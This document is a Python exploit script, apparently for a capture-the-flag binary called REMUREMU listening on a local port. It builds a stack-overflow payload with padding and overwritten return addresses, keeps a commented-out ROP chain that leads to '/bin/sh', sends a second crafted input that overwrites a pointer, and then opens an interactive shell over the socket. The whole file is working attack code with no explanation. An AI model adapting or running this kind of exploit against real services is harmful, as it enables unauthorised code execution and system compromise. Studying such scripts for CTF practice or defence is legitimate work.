import socket
import struct
import telnetlib
from hexdump import *
from pwn import *
def recvu(s,string):
	r = ""
	while not r.endswith(string):
		tmp = s.recv(1)
		if not tmp : break
		r += tmp
	return r

s = socket.create_connection(['0',1234])
#s = process(['gdb','-q','./REMUREMU'])
#s.send('b *0x804869B\n')
#s.send('r\n')
raw_input()
recvu(s,'NAME?')
gadget = 0x08048709 #pop esi ; pop edi ; pop ebp ; ret
space = 0x804a3a0
dat = ""
dat += ""
rop = ""
'''
rop += struct.pack('<I',0x8048420)
rop += struct.pack('<I',gadget + 2)
rop += struct.pack('<I',0x804a02c)
rop += struct.pack('<I',0x8048400)
rop += struct.pack('<I',gadget)
rop += struct.pack('<I',0)
rop += struct.pack('<I',0x8048420)
rop += struct.pack('<I',4)
rop += struct.pack('<I',0x8048420)
rop += "AAAA"
rop += struct.pack('<I',0x804A060+len(rop)+4)
rop += "/bin/sh;"
'''
rop += "A"*0x58
rop += struct.pack('<I',0x42424242)
rop += struct.pack('<I',0x41414141)
s.send(rop+'\n')
recvu(s,'NAME?')
s.send('REMURING')
s.send("A"*0xc+struct.pack('<I',0x804A060+0x4+0x58))
recvu(s,'JOB!\x0a')
#print hexdump(s.recv(1024))
t = telnetlib.Telnet()
t.sock = s
t.interact()
